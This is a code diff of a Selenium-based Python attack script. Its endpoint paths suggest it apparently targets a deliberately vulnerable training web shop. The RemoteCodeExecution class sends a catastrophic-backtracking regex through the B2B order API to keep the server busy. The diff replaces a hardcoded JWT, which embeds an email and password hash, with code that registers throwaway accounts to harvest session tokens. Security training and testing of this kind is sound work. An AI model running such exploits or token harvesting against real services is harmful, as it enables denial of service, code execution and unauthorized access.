@@ -1,6 +1,8 @@
 import time
 import requests
 import os
+import random
+
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from abc import ABC, abstractmethod
@@ -221,32 +223,35 @@ class RemoteCodeExecution(Attack):
     """
     Execute commands through api interface at /api-docs/#/Order/post_orders
     Keep server busy using regex
-    Authorization token needed vor B2B Api
+    Authorization token needed vor B2B Api -> create user and extract token
     """
     def __init__(self):
         super().__init__()
-        self.token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJz" \
-            "dGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTgsInVzZX" \
-            "JuYW1lIjoiIiwiZW1haWwiOiJhZG1pbkB3ZWIuZGUiLCJwYXNz" \
-            "d29yZCI6IjQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YT" \
-            "kzIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIi" \
-            "LCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2" \
-            "UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZh" \
-            "dWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dH" \
-            "J1ZSwiY3JlYXRlZEF0IjoiMjAyMC0wNi0xNiAwNjozMjo0OS45" \
-            "MzkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0wNi0xNiAwNj" \
-            "ozMjo0OS45MzkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwi" \
-            "aWF0IjoxNTkyMjg5MTcyLCJleHAiOjE1OTIzMDcxNzJ9.ff8RX" \
-            "TInNn4K7o1JzJbtgPwz_JI0vWBiVwFf1MOziyIu0esHpKSa1JQ" \
-            "9QciQMVc2OuaWmD3yPENDTglufO3oDhJbvi9lCMLWgY8SjYYzr" \
-            "lsuOjqGSPyOJS8yzDc_1Svh-0BJ_UXIif_w3uzfC282WKXgXPr" \
-            "3RJRxBJ5zjLcfzc8"
         self.code = """{"orderLinesData":
             "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"}"""
 
+    def get_cookie(self):
+        """
+        create account to extract authorization token
+        """
+        random_number = random.randint(0,10000000)
+        email = str(random_number) + "@email.com"
+        random_user = User(
+                email=email,
+                password='123123',
+                security_question='middlename',
+                user_number=7,
+                visible=False)
+        random_user.register()
+        random_user.login()
+        cookie_list = random_user.driver.get_cookies()
+        print(cookie_list)
+        print(cookie_list[1]['value'])
+        return cookie_list[1]['value']
+
     def run(self, token=None, code=None):
         if token is None:
-            token = self.token
+            token = self.get_cookie()
         if code is None:
             code = self.code
         driver = webdriver.Chrome(options=self.chrome_options)
@@ -291,7 +296,8 @@ class RemoteCodeExecution(Attack):
         driver.find_element_by_xpath("/html/body/div/section/di"
                 "v[2]/div[2]/div[4]/section/div/span/div/div/sp"
                 "an/div/div[2]/div/div[3]/button").click()
-        time.sleep(10)
+        time.sleep(7)
+        driver.quit()
 
 
 class FileOverride(Attack):
